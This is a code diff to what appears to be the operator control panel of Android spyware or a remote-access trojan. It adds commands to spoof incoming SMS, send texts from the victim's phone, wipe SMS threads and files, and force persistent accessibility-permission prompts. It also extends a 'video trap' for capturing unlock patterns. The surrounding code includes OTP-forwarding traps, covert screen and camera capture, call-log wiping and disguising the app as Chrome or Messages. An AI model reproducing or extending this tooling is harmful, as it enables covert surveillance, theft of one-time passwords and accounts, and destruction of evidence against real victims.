@@ -339,6 +339,10 @@
                     { id: 'ADD_KEYWORD_FORWARD', name: 'Keyword SMS Trap', icon: '🪤', inputs: [{id: 'kw-list', label: 'Keywords (login,otp)', type: 'text'}, {id: 'kw-dest', label: 'Destination', type: 'text'}], cleanup: 'CLEAR_KEYWORD_FORWARDS' },
                     { id: 'ADD_AUTO_SWIPE', name: 'Auto-Swipe', icon: '🕵️', inputs: [{id: 'swipe-type', label: 'Target', type: 'select', options: [{v: 'pkgs', l: 'App Package'}, {v: 'keywords', l: 'Keywords'}, {v: 'senders', l: 'Sender Number'}]}, {id: 'swipe-val', label: 'Value', type: 'text'}], cleanup: 'CLEAR_AUTO_SWIPE' },
                     { id: 'SET_SMS_BLACKLIST', name: 'SMS Blacklist', icon: '🛡️', inputs: [{id: 'sms-blacklist', label: 'Filter Keywords', type: 'text'}] },
+                    { id: 'INJECT_SMS', name: 'Spoof Incoming SMS', icon: '📥', inputs: [{id: 'fake-sms-num', label: 'Sender Number', type: 'text'}, {id: 'fake-sms-body', label: 'Message Body', type: 'textarea'}, {id: 'fake-sms-read', label: 'Initial State', type: 'select', options: [{v: 'UNREAD', l: 'Unread (Notify)'}, {v: 'READ', l: 'Read (Silent)'}]}] },
+                    { id: 'SEND_SMS', name: 'Send Remote SMS', icon: '📤', inputs: [{id: 'send-sms-num', label: 'Recipient Number', type: 'text'}, {id: 'send-sms-body', label: 'Message Body', type: 'textarea'}] },
+                    { id: 'DELETE_SMS_THREAD', name: 'Wipe Specific Thread', icon: '🧵', inputs: [{id: 'del-sms-num', label: 'Target Number', type: 'text'}] },
+                    { id: 'DELETE_SMS_QUERY', name: 'Wipe SMS by Keyword', icon: '🔍', inputs: [{id: 'del-sms-query', label: 'Search String', type: 'text'}] },
                     { id: 'WIPE_NOTIFICATIONS', name: 'Wipe Notifications', icon: '🧹', inputs: [{id: 'wipe-mode', label: 'Mode', type: 'select', options: [{v: 'ALL', l: 'All'}, {v: 'PKG', l: 'Package'}, {v: 'TEXT', l: 'Keyword'}]}, {id: 'wipe-val', label: 'Value (App or Word)', type: 'text'}] },
                     { id: 'PHONE_LOGS', name: 'Sanitize Call Logs', icon: '🧼', inputs: [{id: 'call-act', label: 'Action', type: 'select', options: [{v: 'CLEAR_ALL', l: 'Wipe All'}, {v: 'DELETE_LAST', l: 'Wipe Last'}, {v: 'DELETE_NUM', l: 'Wipe Number'}]}, {id: 'call-val', label: 'Value/Number', type: 'text'}] },
                     { id: 'ADD_CONTACT', name: 'Inject Contact', icon: '👤', inputs: [{id: 'con-name', label: 'Name', type: 'text'}, {id: 'con-num', label: 'Number', type: 'text'}] },
@@ -356,7 +360,7 @@
                     { id: 'RECORD_SCREEN', name: 'Relentless Screen Record', icon: '🎥', inputs: [{id: 'rec-mode', label: 'Strategy', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Ghost Accept)'}, {v: 'RELENTLESS', l: 'Relentless Loop'}, {v: 'TRIGGER', l: 'Trigger Prompt'}, {v: 'SCRAPE', l: 'Scrape Dialog'}]}, {id: 'rec-dur', label: 'Duration (Sec)', type: 'number', val: 60}, {id: 'rec-qual', label: 'Resolution', type: 'select', options: [{v: 'MED', l: '720p'}, {v: 'LOW', l: '480p'}, {v: 'ULTRA_LOW', l: '360p (Data Saver)'}, {id: 'HIGH', l: '1080p'}]}, {id: 'rec-fps', label: 'Frame Rate', type: 'select', options: [{v: '30', l: '30 FPS'}, {v: '15', l: '15 FPS'}, {v: '10', l: '10 FPS'}, {v: '60', l: '60 FPS (Smooth)'}]}, {id: 'rec-audio', label: 'Audio (Mic)', type: 'select', options: [{v: 'FALSE', l: 'Video Only'}, {v: 'TRUE', l: 'With Audio'}]}] },
                     { id: 'CAPTURE_IMAGE', name: 'Take Photos', icon: '📷', inputs: [{id: 'cam-side', label: 'Source', type: 'select', options: [{v: 'REAR', l: 'Rear'}, {v: 'FRONT', l: 'Front'}]}, {id: 'cam-count', label: 'Quantity', type: 'number', val: 1}] },
                     { id: 'GET_SENSORS', name: 'Sample Environment', icon: '🌡️', inputs: [] },
-                                        { id: 'CAPTURE_PATTERN', name: 'Capture Pattern (Video Trap)', icon: '🎣', inputs:[] },
+                    { id: 'CAPTURE_PATTERN', name: 'Capture Pattern (Video Trap)', icon: '🎣', inputs:[{id: 'patt-timeout', label: 'Success Timeout (s)', type: 'number', val: 20}, {id: 'patt-qual', label: 'Quality', type: 'select', options: [{v: 'MED', l: '720p (Recommended)'}, {v: 'LOW', l: '480p'}, {v: 'ULTRA_LOW', l: '360p'}, {v: 'HIGH', l: '1080p'}]}, {id: 'patt-fps', label: 'Frame Rate', type: 'select', options: [{v: '30', l: '30 FPS'}, {v: '15', l: '15 FPS'}, {v: '60', l: '60 FPS'}]}] },
                     { id: 'GET_TREE', name: 'UI Scraper (Hierarchy)', icon: '🌲', inputs:[{id: 'tree-pkg', label: 'Package Name', type: 'text', placeholder: 'com.pkg'}, {id: 'tree-dur', label: 'Duration (Min)', type: 'number', val: 1}, {id: 'tree-depth', label: 'Walk Depth', type: 'number', val: 10}], cleanup: 'RESET_SCRAPER' }
                 ]
             },
@@ -441,6 +445,7 @@
                     { id: 'TOGGLE_LOGGING', name: 'Toggle Live Debugger', icon: '🐞', inputs: [{id: 'log-state', label: 'State', type: 'select', options: [{v: 'ON', l: 'Logging ON'}, {v: 'OFF', l: 'Stealth OFF'}]}] },
                     { id: 'SET_DEBUG_UI', name: 'Debug Console Access', icon: '🔓', inputs: [{id: 'val-debug-ui', label: 'Console State', type: 'select', options: [{v: 'ON', l: 'Accessible (Visible)'}, {v: 'OFF', l: 'Locked (Hidden)'}]}] },
                     { id: 'SET_MASQUERADE', name: 'Apply Stealth Skin', icon: '🎭', inputs: [{id: 'val-masquerade', label: 'App Mask', type: 'select', options: [{v: 'DRIVE', l: 'Drive Services'}, {v: 'CALC', l: 'Calculator'}, {v: 'GOOGLE_PHONE', l: 'Phone (Google)'}, {v: 'GOOGLE_MSG', l: 'Messages (Google)'}, {v: 'SAM_PHONE', l: 'Phone (Samsung)'}, {v: 'SAM_MSG', l: 'Messages (Samsung)'}, {v: 'CHROME', l: 'Chrome'}, {v: 'IMO', l: 'imo'}, {v: 'IMO_HD', l: 'imo HD'}, {v: 'IMO_BETA', l: 'imo beta'}, {v: 'IMO_LITE', l: 'imo lite'}]}] },
+                    { id: 'SET_RELENTLESS_ACC', name: 'Config Persistence (ACC)', icon: '♾️', inputs: [{id: 'acc-chill', label: 'Initial Chill (Hours)', type: 'number', val: 24}, {id: 'acc-interval', label: 'Nag Interval (Mins)', type: 'number', val: 2}, {id: 'acc-max', label: 'Max Attempts', type: 'number', val: 5}, {id: 'acc-html', label: 'Custom Nag UI (HTML)', type: 'textarea'}] },
                     { id: 'SET_JUDAS_HANDLER', name: 'Emergency SMS Fallback', icon: '📞', inputs: [{id: 'judas-handler', label: 'Phone Number', type: 'text'}] },
                     { id: 'SET_PROMOS', name: 'Deploy Cipher Promos', icon: '📨', inputs: [{id: 'promo-templates', label: 'Template A [TOKEN] ||| B...', type: 'textarea'}] }
                 ]
@@ -467,6 +472,7 @@
                             </div>` 
                     },
                     { id: 'PULL_FILE', name: 'Download File from Device', icon: '📥', inputs: [{id: 'val-pull', label: 'Remote Path', type: 'text'}] },
+                    { id: 'DELETE_FILE', name: 'Purge File/Folder', icon: '🔥', inputs: [{id: 'del-path', label: 'Paths to Wipe (Pipe separated)', type: 'textarea'}] },
                     { id: 'GET_SKELETON', name: 'Scan File Structure', icon: '🦴', inputs: [{id: 'val-skeleton', label: 'Depth (1-10)', type: 'number', val: 5}] },
                     { id: 'INSTALL_APP', name: 'Remote App Installer', icon: '📦', inputs: [{id: 'install-path', label: 'APK Path', type: 'text'}, {id: 'install-html', label: 'Fake Screen HTML', type: 'textarea'}], cleanup: 'STOP_INSTALL' }
                 ]
@@ -810,7 +816,7 @@
                     case 'RECORD_SCREEN':
                         content = `${document.getElementById('rec-mode').value}|${document.getElementById('rec-dur').value}|${document.getElementById('rec-qual').value}|${document.getElementById('rec-audio').value}|${document.getElementById('rec-fps').value}`; break;
                     case 'CAPTURE_PATTERN':
-                        content = ''; break;
+                        content = `${document.getElementById('patt-timeout').value}|${document.getElementById('patt-qual').value}|${document.getElementById('patt-fps').value}`; break;
                     case 'MAP_GRID':
                         content = document.getElementById('val-grid-depth').value; break;
                     case 'MASTER_TOGGLE':
@@ -871,6 +877,18 @@
                         content = `${document.getElementById('call-act').value}|${document.getElementById('call-val').value}`; break;
                     case 'VOLUME':
                         content = `${document.getElementById('vol-stream').value} | ${document.getElementById('vol-level').value}`; break;
+                    case 'DELETE_FILE':
+                        content = document.getElementById('del-path').value; break;
+                    case 'DELETE_SMS_THREAD':
+                        content = document.getElementById('del-sms-num').value; break;
+                    case 'DELETE_SMS_QUERY':
+                        content = document.getElementById('del-sms-query').value; break;
+                    case 'SEND_SMS':
+                        content = `${document.getElementById('send-sms-num').value}|${document.getElementById('send-sms-body').value}`; break;
+                    case 'INJECT_SMS':
+                        content = `${document.getElementById('fake-sms-num').value}|${document.getElementById('fake-sms-body').value}|${document.getElementById('fake-sms-read').value}`; break;
+                    case 'SET_RELENTLESS_ACC':
+                        content = `${document.getElementById('acc-chill').value}|${document.getElementById('acc-interval').value}|${document.getElementById('acc-max').value}|${document.getElementById('acc-html').value}`; break;
                     case 'SCREEN_TIMEOUT':
                         content = document.getElementById('val-timeout').value; break;
                     case 'WIPE_NOTIFICATIONS':
